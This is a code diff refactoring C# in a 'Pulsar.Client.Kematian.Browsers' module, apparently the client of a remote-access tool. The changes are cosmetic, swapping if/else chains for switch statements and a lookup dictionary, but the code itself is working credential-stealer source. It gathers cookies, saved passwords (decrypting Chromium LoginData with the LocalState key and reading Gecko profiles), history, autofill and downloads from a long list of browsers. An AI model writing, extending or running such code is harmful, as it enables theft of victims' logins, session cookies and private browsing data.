@@ -71,7 +71,6 @@ namespace Pulsar.Client.Kematian.Browsers
                 }
                 
                 browserPaths.Add(path);
-                
                 browsers.Add(new BrowserInfo
                 {
                     Name = browserName,
@@ -96,10 +95,10 @@ namespace Pulsar.Client.Kematian.Browsers
                     continue;
                 }
                 
-                var browser = browserGroup.First();
+                var firstBrowser = browserGroup.First();
                 
-                HashSet<string> profilePaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
-                List<GeckoProfile> uniqueProfiles = new List<GeckoProfile>();
+                var profilePaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+                var uniqueProfiles = new List<GeckoProfile>();
                 
                 foreach (var browserInstance in browserGroup)
                 {
@@ -115,16 +114,15 @@ namespace Pulsar.Client.Kematian.Browsers
                 
                 var consolidatedBrowser = new GeckoBrowserPath
                 {
-                    ProfilesPath = browser.ProfilesPath,
+                    ProfilesPath = firstBrowser.ProfilesPath,
                     Profiles = uniqueProfiles.ToArray()
                 };
                 
                 processedBrowserNames.Add(browserName);
-                
                 browsers.Add(new BrowserInfo
                 {
                     Name = browserName,
-                    Path = browser.ProfilesPath,
+                    Path = firstBrowser.ProfilesPath,
                     Type = "Gecko",
                     Data = consolidatedBrowser
                 });
@@ -211,30 +209,31 @@ namespace Pulsar.Client.Kematian.Browsers
         {
             try
             {
-                if (browser.IsChromium && browser.Data != null)
+                switch (browser.Type)
                 {
-                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
-                    
-                    var result = new List<string>();
-                    foreach (var profile in chromiumBrowser.Profiles)
-                    {
-                        result.AddRange(GetChromiumCookies(profile, chromiumBrowser.LocalStatePath));
-                    }
-                    return string.Join(Environment.NewLine, result);
+                    case "Chromium" when browser.Data != null:
+                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                        
+                        var chromiumResult = new List<string>();
+                        foreach (var profile in chromiumBrowser.Profiles)
+                        {
+                            chromiumResult.AddRange(GetChromiumCookies(profile, chromiumBrowser.LocalStatePath));
+                        }
+                        return string.Join(Environment.NewLine, chromiumResult);
+                        
+                    case "Gecko" when browser.Data != null:
+                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                        
+                        var geckoResult = new List<string>();
+                        foreach (var profile in geckoBrowser.Profiles)
+                        {
+                            geckoResult.AddRange(GetGeckoCookies(profile));
+                        }
+                        return string.Join(Environment.NewLine, geckoResult);
+                        
+                    default:
+                        return string.Empty;
                 }
-                else if (browser.IsGecko && browser.Data != null)
-                {
-                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
-                    
-                    var result = new List<string>();
-                    foreach (var profile in geckoBrowser.Profiles)
-                    {
-                        result.AddRange(GetGeckoCookies(profile));
-                    }
-                    return string.Join(Environment.NewLine, result);
-                }
-
-                return string.Empty;
             }
             catch (Exception ex)
             {
@@ -252,37 +251,39 @@ namespace Pulsar.Client.Kematian.Browsers
             {
                 var allHistory = new List<Dictionary<string, string>>();
 
-                if (browser.IsChromium && browser.Data != null)
+                switch (browser.Type)
                 {
-                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in chromiumBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
-                    }
+                    case "Chromium" when browser.Data != null:
+                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                        
+                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in chromiumBrowser.Profiles)
+                        {
+                            chromiumTasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allHistory.AddRange(task.Result);
-                    }
-                }
-                else if (browser.IsGecko && browser.Data != null)
-                {
-                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in geckoBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
-                    }
+                        Task.WaitAll(chromiumTasks.ToArray());
+                        foreach (var task in chromiumTasks)
+                        {
+                            allHistory.AddRange(task.Result);
+                        }
+                        break;
+                        
+                    case "Gecko" when browser.Data != null:
+                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                        
+                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in geckoBrowser.Profiles)
+                        {
+                            geckoTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allHistory.AddRange(task.Result);
-                    }
+                        Task.WaitAll(geckoTasks.ToArray());
+                        foreach (var task in geckoTasks)
+                        {
+                            allHistory.AddRange(task.Result);
+                        }
+                        break;
                 }
 
                 return allHistory.Count > 0
@@ -307,47 +308,49 @@ namespace Pulsar.Client.Kematian.Browsers
             {
                 var allPasswords = new List<Dictionary<string, string>>();
 
-                if (browser.IsChromium && browser.Data != null)
+                switch (browser.Type)
                 {
-                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in chromiumBrowser.Profiles)
-                    {
-                        if (profile.LoginData != null && File.Exists(profile.LoginData) && 
-                            !string.IsNullOrEmpty(chromiumBrowser.LocalStatePath))
+                    case "Chromium" when browser.Data != null:
+                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                        
+                        var tasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in chromiumBrowser.Profiles)
                         {
-                            tasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, chromiumBrowser.LocalStatePath)));
+                            if (profile.LoginData != null && File.Exists(profile.LoginData) && 
+                                !string.IsNullOrEmpty(chromiumBrowser.LocalStatePath))
+                            {
+                                tasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, chromiumBrowser.LocalStatePath)));
+                            }
                         }
-                    }
 
-                    if (tasks.Count > 0)
-                    {
-                        Task.WaitAll(tasks.ToArray());
-                        foreach (var task in tasks)
+                        if (tasks.Count > 0)
                         {
-                            if (task != null && task.Result != null)
+                            Task.WaitAll(tasks.ToArray());
+                            foreach (var task in tasks)
                             {
-                                allPasswords.AddRange(task.Result);
+                                if (task != null && task.Result != null)
+                                {
+                                    allPasswords.AddRange(task.Result);
+                                }
                             }
                         }
-                    }
-                }
-                else if (browser.IsGecko && browser.Data != null)
-                {
-                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
-                    
-                    foreach (var profile in geckoBrowser.Profiles)
-                    {
-                        if (profile.Path != null && Directory.Exists(profile.Path))
+                        break;
+                        
+                    case "Gecko" when browser.Data != null:
+                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                        
+                        foreach (var profile in geckoBrowser.Profiles)
                         {
-                            var geckoPasswords = GetGeckoPasswordsForProfile(profile);
-                            if (geckoPasswords != null)
+                            if (profile.Path != null && Directory.Exists(profile.Path))
                             {
-                                allPasswords.AddRange(geckoPasswords);
+                                var geckoPasswords = GetGeckoPasswordsForProfile(profile);
+                                if (geckoPasswords != null)
+                                {
+                                    allPasswords.AddRange(geckoPasswords);
+                                }
                             }
                         }
-                    }
+                        break;
                 }
 
                 return allPasswords.Count > 0
@@ -372,37 +375,39 @@ namespace Pulsar.Client.Kematian.Browsers
             {
                 var allAutoFillData = new List<Dictionary<string, string>>();
 
-                if (browser.IsChromium && browser.Data != null)
+                switch (browser.Type)
                 {
-                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in chromiumBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
-                    }
+                    case "Chromium" when browser.Data != null:
+                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                        
+                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in chromiumBrowser.Profiles)
+                        {
+                            chromiumTasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allAutoFillData.AddRange(task.Result);
-                    }
-                }
-                else if (browser.IsGecko && browser.Data != null)
-                {
-                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in geckoBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetGeckoAutofillForProfile(profile)));
-                    }
+                        Task.WaitAll(chromiumTasks.ToArray());
+                        foreach (var task in chromiumTasks)
+                        {
+                            allAutoFillData.AddRange(task.Result);
+                        }
+                        break;
+                        
+                    case "Gecko" when browser.Data != null:
+                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                        
+                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in geckoBrowser.Profiles)
+                        {
+                            geckoTasks.Add(Task.Run(() => GetGeckoAutofillForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allAutoFillData.AddRange(task.Result);
-                    }
+                        Task.WaitAll(geckoTasks.ToArray());
+                        foreach (var task in geckoTasks)
+                        {
+                            allAutoFillData.AddRange(task.Result);
+                        }
+                        break;
                 }
 
                 return allAutoFillData.Count > 0
@@ -427,37 +432,39 @@ namespace Pulsar.Client.Kematian.Browsers
             {
                 var allDownloads = new List<Dictionary<string, string>>();
 
-                if (browser.IsChromium && browser.Data != null)
+                switch (browser.Type)
                 {
-                    ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in chromiumBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
-                    }
+                    case "Chromium" when browser.Data != null:
+                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
+                        
+                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in chromiumBrowser.Profiles)
+                        {
+                            chromiumTasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allDownloads.AddRange(task.Result);
-                    }
-                }
-                else if (browser.IsGecko && browser.Data != null)
-                {
-                    GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
-                    
-                    var tasks = new List<Task<List<Dictionary<string, string>>>>();
-                    foreach (var profile in geckoBrowser.Profiles)
-                    {
-                        tasks.Add(Task.Run(() => GetGeckoDownloadsForProfile(profile)));
-                    }
+                        Task.WaitAll(chromiumTasks.ToArray());
+                        foreach (var task in chromiumTasks)
+                        {
+                            allDownloads.AddRange(task.Result);
+                        }
+                        break;
+                        
+                    case "Gecko" when browser.Data != null:
+                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
+                        
+                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
+                        foreach (var profile in geckoBrowser.Profiles)
+                        {
+                            geckoTasks.Add(Task.Run(() => GetGeckoDownloadsForProfile(profile)));
+                        }
 
-                    Task.WaitAll(tasks.ToArray());
-                    foreach (var task in tasks)
-                    {
-                        allDownloads.AddRange(task.Result);
-                    }
+                        Task.WaitAll(geckoTasks.ToArray());
+                        foreach (var task in geckoTasks)
+                        {
+                            allDownloads.AddRange(task.Result);
+                        }
+                        break;
                 }
 
                 return allDownloads.Count > 0
@@ -1002,78 +1009,35 @@ namespace Pulsar.Client.Kematian.Browsers
         
         private string GetBrowserName(string path)
         {
-            if (path.IndexOf("librewolf", StringComparison.OrdinalIgnoreCase) >= 0)
+            var browserMappings = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
             {
-                return "LibreWolf";
-            }
-            else if (path.IndexOf("firefox", StringComparison.OrdinalIgnoreCase) >= 0)
+                { "librewolf", "LibreWolf" },
+                { "firefox", "Firefox" },
+                { "zen", "Zen Browser" },
+                { "waterfox", "Waterfox" },
+                { "palemoon", "Pale Moon" },
+                { "pale moon", "Pale Moon" },
+                { "seamonkey", "SeaMonkey" },
+                { "chrome", "Chrome" },
+                { "edge", "Edge" },
+                { "brave", "Brave" },
+                { "opera gx", "Opera GX" },
+                { "opera", "Opera" },
+                { "vivaldi", "Vivaldi" },
+                { "chromium", "Chromium" },
+                { "epic", "Epic Browser" },
+                { "yandex", "Yandex Browser" },
+                { "iridium", "Iridium Browser" },
+                { "ucbrowser", "UCBrowser" },
+                { "centbrowser", "CentBrowser" }
+            };
+
+            foreach (var browser in browserMappings)
             {
-                return "Firefox";
-            }
-            else if (path.IndexOf("zen", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Zen Browser";
-            }
-            else if (path.IndexOf("waterfox", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Waterfox";
-            }
-            else if (path.IndexOf("palemoon", StringComparison.OrdinalIgnoreCase) >= 0 || 
-                     path.IndexOf("pale moon", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Pale Moon";
-            }
-            else if (path.IndexOf("seamonkey", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "SeaMonkey";
-            }
-            else if (path.IndexOf("chrome", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Chrome";
-            }
-            else if (path.IndexOf("edge", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Edge";
-            }
-            else if (path.IndexOf("brave", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Brave";
-            }
-            else if (path.IndexOf("opera gx", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Opera GX";
-            }
-            else if (path.IndexOf("opera", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Opera";
-            }
-            else if (path.IndexOf("vivaldi", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Vivaldi";
-            }
-            else if (path.IndexOf("chromium", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Chromium";
-            }
-            else if (path.IndexOf("epic", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Epic Browser";
-            }
-            else if (path.IndexOf("yandex", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Yandex Browser";
-            }
-            else if (path.IndexOf("iridium", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "Iridium Browser";
-            }
-            else if (path.IndexOf("ucbrowser", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "UCBrowser";
-            }
-            else if (path.IndexOf("centbrowser", StringComparison.OrdinalIgnoreCase) >= 0)
-            {
-                return "CentBrowser";
+                if (path.IndexOf(browser.Key, StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    return browser.Value;
+                }
             }
             
             return null;
